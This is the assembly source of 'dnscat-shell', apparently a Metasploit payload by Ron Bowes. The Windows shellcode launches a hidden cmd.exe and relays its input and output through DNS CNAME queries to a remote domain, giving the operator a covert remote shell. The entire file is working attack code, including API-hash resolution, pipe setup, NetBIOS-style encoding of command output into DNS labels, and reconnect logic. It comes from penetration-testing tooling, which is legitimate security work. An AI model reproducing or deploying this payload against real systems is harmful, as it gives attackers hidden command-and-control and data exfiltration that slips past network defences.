; dnscat-shell.asm
; By Ron Bowes
; Created March, 2010
;
; (See LICENSE.txt)
;
; Note: there are two types of lines with (REPLACE*) after them:
; o REPLACEMSF - these are the lines used when we compile for Metasploit
; o REPLACETEST - these are the lines used when we actually want to run the code
;
; To properly run, one of them has to be removed. Lines with simply (REPLACE) can
; be left intact. 
BITS 32

; Important functions:
; 0x0726774C = kernel32.dll!LoadLibraryA
; 0x528796C6 = kernel32.dll!CloseHandle
; 0x0EAFCF3E = kernel32.dll!CreatePipe
; 0x863FCC79 = kernel32.dll!CreateProcessA
; 0xBB5F9EAD = kernel32.dll!ReadFile
; 0x5BAE572D = kernel32.dll!WriteFile
; 0xB33CB718 = kernel32.dll!PeekNamedPipe
; 0xE035F044 = kernel32.dll!Sleep
; 0x6BCED369 = kernel32.dll!GetTickCount
; 0xE553A458 = kernel32.dll!VirtualAlloc
; 0xC99CC96A = dnsapi.dll!DnsQuery_A
; 0x1F90D2E8 = ntdll.dll!sprintf
; 0x09FD5189 = ntdll.dll!strchr
; 0x2BCD5349 = ntdll.dll!strtol
; 0x0A0D4FC9 = ntdll.dll!strcat
; 0x0A355389 = ntdll.dll!strcpy
;
; Patterns to replace:
; "1111" - Delay, in milliseconds, when data is queued (10)
; "2222" - Delay, in milliseconds, when no data is queued (1000)
; "3333" - Exitfunc
; "4444" - Bytes / data section (before encoding) (31)
; "5555" - Number of data sections (3)
; "6666" - Backoff, in milliseconds, when an error occurs (30000)
; "7777" - The identifier
 
  cld ; Clear the direction flag (probably not necessary, but all kinds of things will break if we don't)
  call start
%include "block_api.asm"
start:
  pop ebp ; ebp => address of api_call, which we're going to use a lot

; Load dnsapi.dll, which isn't loaded in most apps
call load_dnsapi
 db 'dnsapi.dll',0
load_dnsapi:
 push 0x0726774C ; kernel32.dll!LoadLibrary
 call ebp

; Allocate space that we can work with
; 0x0000 - 0x03FF - primary buffer (esi will always point to this)
; 0x0400 - 0x07FF - secondary buffer (edi will usually point to this)
; 0x0800 - 0x0FFF - extra space
 push byte 0x04 ; PAGE_READWRITE
 push 0x1000 ; MEM_COMMIT (0x1000)
 push 0x1000 ; dwSize (0x1000)
 push byte 0 ; lpAddress
 push 0xE553A458 ; kernel32.dll!VirtualAlloc
 call ebp
 xchg esi, eax ; esi -> buffer

; Get the initial sequence number (the result of GetTickCount())
 push 0x6BCED369 ; kernel32.dll!GetTickCount
 call ebp 
 mov [esi+0x9FC], eax ; Sequence number -> result of GetTickCount() - will increment
 mov [esi+0x9F8], eax ; sessionid -> result of GetTickCount() - remains constant

; Make some stack room
sub esp, 256

; Zero out the stack
mov edi, esp
mov ecx, 256
xor eax, eax
rep stosb

; Set the security attributes
mov byte [esp+100], 12  ; nLength
mov byte [esp+100+8], 1 ; bInheritHandles

; Create our pipes
lea edx, [esp+100] ; edx -> our SECURITY_ATTRIBUTES
lea eax, [esp+4] ; eax -> ptr stdin write
push byte 0 ; nSize
push edx ; sa
push eax ; ptr stdin write
sub eax, 4 ; eax -> ptr stdin read
push eax ; ptr stdin read
push 0x0EAFCF3E ; kernel32.dll!CreatePipe
call ebp

lea edx, [esp+100] ; edx -> our SECURITY_ATTRIBUTES
lea eax, [esp+12] ; eax -> ptr stdout write
push byte 0 ; nSize
push edx ; sa
push eax ; stdout write
sub eax, 4 ; eax -> ptr stdout read
push eax ; stdout read
push 0x0EAFCF3E ; kernel32.dll!CreatePipe
call ebp

; Set up the STARUPINFOA structure
mov dword [esp+16], 68 ; cb (startupinfo length = 68)
mov dword [esp+16+44], 0x100 ; flags = STARF_USESTDHANDLES

mov ecx, [esp+0] ; ecx -> stdin read
mov dword [esp+16+56], ecx ; hStdInput = stdin (read)

mov edx, [esp+12] ; edx -> stdout write
mov dword [esp+16+60], edx ; hStdOutput = stdout (write)
mov dword [esp+16+64], edx ; hStdError = stdout (write)

; Create the process
mov edx, esp ; Store esp before we start changing the stack
lea ecx, [edx+84]
push ecx ; lpProcessInfo
lea ecx, [edx+16]
push ecx ; lpStartupInfo
push byte 0 ; lpCurrentDirectory (NULL)
push byte 0 ; lpEnvironment (NULL)
push 0x08000000 ; dwFlags (CREATE_NO_WINDOW)
push byte 1 ; bInheritHandles (TRUE)
lea ecx, [edx+100]
push ecx ; threadAttributes (sa)
push ecx ; processAttributes (sa)

call get_cmd
 db 'cmd.exe',0
get_cmd:

push byte 0 ; lpApplicationName (NULL)
push 0x863FCC79 ; kernel32.dll!CreateProcessA
call ebp


; Close the two handles we don't need
; Note: we don't really have to close the stdin handle, but it's good practice (and only a few bytes :) )
push dword [esp+0] ; stdin (read)
push 0x528796C6 ; kernel32.dll!CloseHandle
call ebp

push dword [esp+12] ; stdout (write)
push 0x528796C6 ; kernel32.dll!CloseHandle
call ebp

; Now that the process and pipes are all set up, we enter the main loop
top_main:
 ; Clear the temporary buffer
 mov edi, esi
 xor eax, eax
 mov ecx, 0x998 ; Leave the last 8 bytes, which I'm using for storage
 rep stosb

 ; Send the message
 mov ecx, [esp+8] ; ecx -> stdout read
 call send_message

 ; Check if we got any data back
 test edx, edx
 jz no_data_returned

 mov ecx, [esp+4] ; stdin write

 push byte 0 ; lpOverLapped
 lea eax, [esi+0x800]
 push eax ; dwNumberOfBytesWritten (scratch space)
 push edx ; dwNumberOfBytesToWrite
 push esi ; lpBuffer
 push ecx ; hFile
 push 0x5BAE572D ; kernel32.dll!WriteFile
 call ebp
 
no_data_returned:
 ; If there's data waiting, we only want to do a quick delay (to avoid flooding the network)
 mov ecx, [esp+8] ; stdout read
 call is_data_waiting
 test eax, eax
 jz longer_delay
 push 0x31313131 ; (REPLACEMSF)
 push 10 ; (REPLACETEST)
 jmp do_sleep
longer_delay: 
 push 0x32323232 ; (REPLACEMSF)
 push 1000 ; (REPLACETEST)
do_sleep:
 push 0xE035F044 ; kernel32.dll!Sleep
 call ebp

 jmp top_main

done:
; add esp, 256 (who cares?)
 push 0x33333333 ; EXITFUNC (REPLACE)
 call ebp

;;; is_data_waiting()
; Checks if any data is waiting on the pipe given by ecx. Returns non-zero in eax if it is. 
;
; esi = buffer
; ecx = named pipe
is_data_waiting:
 ; Check if any data is waiting using PeekNamedPipe()
 push byte 0 ; lpBytesLeftThisMessage
 push byte 0 ; lpTotalBytesAvail
 lea eax, [esi+0x800]
 push eax ; lpBytesRead
 push byte 4 ; nBufferSize
 lea eax, [esi+0x800] ; Buffer ptr
 push eax ; lpBuffer
 push ecx ; hNamedPipe = stdout read
 push 0xB33CB718 ; kernel32.dll!PeekNamedPipe
 call ebp

 ; If there's an error, cmd.exe has closed
 test eax, eax
 jz done

 mov eax, [esi+0x800]
ret

;;; read_data()
; Reads up to 31 bytes of data from the named pipe, fake non-blocking. Number of bytes is returned in edx. 
;
; esi = buffer
; ecx = named pipe
read_data:

 push byte 0 ; lpOverlapped
 lea eax, [esi+0x800]
 push eax ; lpNumberOfBytesRead
 push 0x34343434 ; nNumberOfBytesToRead (REPLACEMSF)
 push byte 31 ; nNumberOfBytesToRead (REPLACETEST)
 push esi ; lpBuffer
 push ecx ; hFile = stdout read
 push 0xBB5F9EAD ; kernel32.dll!ReadFile
 call ebp

 ; If there's an error, cmd.exe has closed
 test eax, eax
 jz done

 ; Get the number of bytes read, then return
 mov edx, [esi+0x800]

 ret

;;; send_message()
; Send a message out over dns. This will keep trying, backing off for certain intervals, until
; it is successful. 
;
; esi = buffer (will receive the output)
; ecx = the read handle
send_message:
 push ecx ; Preserve the read handle [esp+4]
 push byte 0 ; Make some room on the stack for the section count [esp]

 ; Get edi ready (we're going to build the format string in edi)
 lea edi, [esp+0x400]
 
 ; Build the beginning of the format string
 call get_prefix
 db 'dnscat.61.77777777.%x.%x.%x.',0 ; REPLACE (the 77777777 w/ identifier)
get_prefix:
 push edi
 push 0x0A355389 ; ntdll.dll!strcpy
 call ebp 
 add esp, 8

read_top:
 ; Check if any data is waiting
 mov ecx, [esp+4]
 call is_data_waiting
 test eax, eax
 jz reading_over

 ; We know there's data waiting, so read it. 
 mov ecx, [esp+4]
 call read_data

 ; Increment the section count
 inc dword [esp]

 ; Encode the string, NetBIOS-style. This goes from the end to the beginning. 
 lea ecx, [edx*2] ; ecx now indexes the last encoded character

 ; Add the null and period at the end
 mov byte [esi+ecx], '.'
 mov byte [esi+ecx+1], 0

encode_top:
 dec edx
 mov ah, byte [esi+edx] ; Get the left nibble
 mov al, byte [esi+edx] ; Get the right nibble

 shr ah, 0x04
 and al, 0x0F
 add ax, 0x4141 ; Add 'A' to both sides

 dec ecx
 mov byte [esi+ecx], al
 dec ecx
 mov byte [esi+ecx], ah

 test edx, edx
 jnz encode_top

 ; Now we have the next chunk encoded in esi. Add it to the string in edi
 push esi
 push edi
 push 0x0A0D4FC9 ; ntdll.dll!strcat
 call ebp 
 add esp, 8
 
 ; Jump to the top until we have three data sections (we can return early, too)
 cmp dword [esp], 0x35353535 ; (REPLACEMSF)
 cmp dword [esp], 3 ; (REPLACETEST)
 jl read_top
reading_over:
 ; Add the domain to the end
 jmp get_domain
get_domain_top:
 push edi
 push 0x0A0D4FC9 ; ntdll.dll!strcat
 call ebp 
 add esp, 8

 ; At this point, we have a string in edi that looks something like this:
 ; dnscat.61.<identifier>.%x.%x.%x.data.%x.<domain>
 ; Now, we have to fill in the four integers
 ; 1: sessionid (random generated integer)
 ; 2: sequence number (random generated integer, increments each packet)
 ; 3: number of sections
 ; 4: a legitimately random number (to prevent caching)

 ; (4) An effectively random value to prevent caching (we're using GetTickCount()'s return value) 
 push 0x6BCED369 ; kernel32.dll!GetTickCount
 call ebp 

 pop ecx ; restore: ecx -> section count

 push eax

 ; (3) number of sections
 push ecx

 ; (2) sequence number
 mov eax, [esi+0x9FC]
 inc dword [esi+0x9FC]
 push eax ; sequence

 ; (1) sessionid
 mov eax, [esi+0x9F8]
 push eax

 ; The format string
 push edi

 ; The buffer
 push esi

 push 0x1F90D2E8 ; ntdll.dll!sprintf
 call ebp
 add esp, 24 ; Clean up the stack after sprintf, a __cdecl function

send_request:
 push byte 0x00 ; pReserved (has to be 0)
 push edi ; ptr to result set
 push byte 0x00 ; pExtra (has to be 0)
 push byte 0x08 ; Options (DNS_QUERY_BYPASS_CACHE)
 push byte 0x05 ; wType (DNS_TYPE_CNAME)
 push esi ; lpStrName
 push 0xC99CC96A
 call ebp ; DnsQuery_A
 test eax, eax
 jz send_successful

 ; If the send failed, back off for awhile and try again. 
 ;
 ; The reason I'm making this high is because when I test a long connection outage, I have a lot of
 ; issues with duplicate packets with bad sequence numbers showing up. While I can't prevent that, 
 ; this at least waits for all the sessions to time out. 
 push 0x36363636 ; (REPLACE)
 push 30000 ; (REPLACE)
 push 0xE035F044 ; kernel32.dll!Sleep
 call ebp

 ; Choose a new sequence number. This prevents re-transmissions of old packets from causing us
 ; grief by accidentally hitting an actual sequence number. 
 push 0x6BCED369 ; kernel32.dll!GetTickCount
 call ebp 
 mov [esi+0x9FC], eax

 ; Try sending the request again. 
 jmp send_request

 send_successful:
 mov eax, [edi] ; dereference the pointer to the PDNS_RECORD
 mov eax, [eax+24] ; get the dns response

 ; Jump past the signature ('dnscat')
 push byte '.'
 push eax
 push 0x09FD5189 ; ntdll.dll!strchr
 call ebp
 add esp, 8
 inc eax ; eax now points to the flags

 ; Parse the flags
 xchg eax, ebx ; ebx -> current position in the string
 push byte 16
 push byte 0
 push ebx
 push 0x2BCD5349 ; ntdll.dll!strtol
 call ebp
 add esp, 12
 xchg eax, ebx ; ebx -> flags
 mov edi, ebx ; edi -> flags

 ; Check if the 'RST' flags is set
 test edi, 0x08 ; 8 => FLAG_RST
 jnz done

 ; Jump over flags to the next section
 push byte '.'
 push eax
 push 0x09FD5189 ; ntdll.dll!strchr
 call ebp
 add esp, 8
 inc eax ; We're now on the first character of the next field

 ; Check if the packet contains an identifier; if it does, skip it. 
 test edi, 0x40 ; FLAG_IDENTIFIER
 jz no_identifier
 push byte '.'
 push eax
 push 0x09FD5189 ; ntdll.dll!strchr
 call ebp
 add esp, 8
 inc eax ; We're now on the first character of the next field
no_identifier:

 ; Check if we have a session id; if we do, skip it
 test edi, 0x20 ; FLAG_IDENTIFIER
 jz no_session
 push byte '.'
 push eax
 push 0x09FD5189 ; ntdll.dll!strchr
 call ebp
 add esp, 8
 inc eax ; We're now on the first character of the next field
no_session:

 ; Check if we have a sequence number; if we do, skip it.  
 test edi, 0x01 ; FLAG_STREAM
 jz no_seq
 push byte '.'
 push eax
 push 0x09FD5189 ; ntdll.dll!strchr
 call ebp
 add esp, 8
 inc eax ; We're now on the first character of the next field
no_seq:

 ; Parse the section count
 xchg eax, ebx ; ebx -> current position in the string
 push byte 16
 push byte 0
 push ebx
 push 0x2BCD5349 ; ntdll.dll!strtol
 call ebp
 add esp, 12
 xchg eax, ebx ; ebx -> section count

 ; Jump past the section count (to the start of the data)
 push byte '.'
 push eax
 push 0x09FD5189 ; ntdll.dll!strchr
 call ebp
 add esp, 8
 inc eax ; eax now points to the first data section

 ; Get the current section
 xor edx, edx ; edx is going to store the length, while esi will store the data
 test ebx, ebx ; Make sure we have at least one section...
 jz process_data_done ; ... if not, just return 0 length
process_string_start:
 mov ch, byte [eax] ; First nibble
 inc eax
 cmp ch, '.'
 je process_string_done

 mov cl, byte [eax] ; First nibble
 inc eax
 cmp cl, '.'
 je process_string_done

 and cx, 0xDFDF ; Remove case
 sub cx, 0x4141 ; Convert the two characters to two numbers
 shl ch, 4
 or cl, ch

 mov byte [esi+edx], cl ; Move cl into the target string
 inc edx ; Increment the string length

 jmp process_string_start ; Jump back to the top

process_string_done: ; When we get here, we're sitting on the start of the next section
 dec ebx ; Decrement the section count
 jnz process_string_start 
  
process_data_done:
 add esp, 4 ; 
 ret



; Note: this has to start with '%x', which will be replaced with a random token later. 
get_domain: 
 call get_domain_top
 db '%x.'

; Used only for testing
db 'skullseclabs.org',0 ; (REPLACETEST)

